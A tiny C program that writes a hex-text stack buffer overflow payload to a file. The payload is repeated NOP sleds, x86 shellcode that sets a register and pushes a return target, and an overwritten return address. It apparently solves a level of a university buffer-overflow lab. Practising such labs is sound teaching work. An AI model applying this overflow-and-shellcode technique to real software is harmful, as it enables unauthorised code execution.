#include "stdio.h"
void main() {
  int x = 509;
  int i=0;
  int j=0;
  FILE* fp = fopen("test", "w");
  for (j=0; j<5; j++) {
    for (i=0; i<505; i++) {
      fprintf(fp,"90 ");
    }
    fprintf(fp, "8d 6c 24 28 b8 c3 d4 cc 17 68 4e 8c 04 08 c3 90 90 90 90 98 30 68 55 0a ");
  }
  fclose(fp);
}
